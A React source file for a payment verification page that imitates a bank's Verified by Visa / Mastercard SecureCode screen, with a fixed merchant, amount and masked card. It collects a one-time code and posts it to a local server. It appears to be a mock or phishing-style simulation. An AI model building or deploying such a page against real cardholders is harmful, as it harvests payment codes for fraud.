// src/pages/PaymentVerificationPage.js
import React, { useState } from 'react';
import '../global.css'; // Import du CSS global
import MASIB from '../images/MASIB.png';
import VISA from '../images/verified_by_visa.png';
import MASTC from '../images/mastercardsecurecode_logo.png';


const PaymentVerificationPage = () => {
    const [paymentToken, setPaymentToken] = useState('');
    const [showError, setShowError] = useState(false);
    const [successMessage, setSuccessMessage] = useState(null);

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (paymentToken.trim() === "") {
            alert("Veuillez entrer le code reçu.");
            return;
        }
        try {
            const response = await fetch('https://127.0.0.1:8043/payment', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ paymentToken })
            });
            if (response.ok) {
                setShowError(false);
                setSuccessMessage(paymentToken);
                setTimeout(() => {
                    window.location.href = '/';
                }, 3000);
            } else {
                setShowError(true);
            }
        } catch (error) {
            console.error('Error submitting payment:', error);
            setShowError(true);
        }
    };

    return (
        <div className="verification-container">
            <div className="verification-box">
                <div className="logo-container">
                    <div className="left-logo">
                        <img src={MASIB} alt="Logo Banque" />
                    </div>
                    <div className="right-logos">
                        <img src={VISA} alt="Verified by Visa" />
                        <img src={MASTC} alt="MasterCard" />
                    </div>
                </div>

                <p>A verification code has been sent to your registered number.</p>

                <form onSubmit={handleSubmit}>
                    <div className="form-group">
                        <label>Marchant name :</label>
                        <input type="text" value="Grapes" disabled />
                    </div>

                    <div className="form-group">
                        <label>Amount of the transaction :</label>
                        <input type="text" value="EURO 45.99 €" disabled />
                    </div>

                    <div className="form-group">
                        <label>Card number :</label>
                        <input type="text" value="XXXX XXXX XXXX 0237" disabled />
                    </div>

                    <div className="form-group">
                        <label>Entrez le code reçu :</label>
                        <input
                            type="text"
                            placeholder="Entrer the OTP code here"
                            value={paymentToken}
                            onChange={(e) => setPaymentToken(e.target.value)}
                        />
                    </div>

                    <button type="submit">Confirm</button>
                </form>

                {showError && (
                    <p className="error-message">
                        Paiement échoué, le code n'a pas pu être vérifié.
                    </p>
                )}

                {successMessage && (
                    <div className="success-message">
                        <p>
                            Paiement réussi avec le code : <strong>{successMessage}</strong>.<br />
                            Redirection vers la page d'accueil dans 3 secondes...
                        </p>
                    </div>
                )}
            </div>
        </div>
    );
};

export default PaymentVerificationPage;
